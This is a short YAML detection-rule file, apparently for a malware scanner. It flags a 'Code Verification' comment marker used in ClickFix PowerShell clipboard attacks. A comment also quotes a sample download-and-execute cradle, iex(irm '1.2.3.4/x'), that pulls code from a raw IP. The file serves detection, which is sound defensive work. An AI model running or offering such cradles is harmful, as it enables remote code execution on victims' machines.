defaults:
  platforms: [windows]
  for: [powershell]

traits:
- id: clickfix-code-verification-comment
  desc: PowerShell Code Verification comment marker
  crit: notable
  conf: 0.97
  for: [powershell, batch, html, javascript]
  if:
    type: text
    # ErrTraffic Beer-cluster clipboard commands prefix the cradle with
    # `<# Code Verification: <digits> #>` (decimal tracking id).
    regex: '(?i)<#\s*Code\s+Verification:\s*\d{6,32}\s*#>'
# ClickFix / fileless cradles often omit the URL scheme: iex(irm '1.2.3.4/x').
# Distinct from bare-domain irm|iex vendor installers (rustup/scoop) which use
# DNS names, not raw IPv4 hosts.
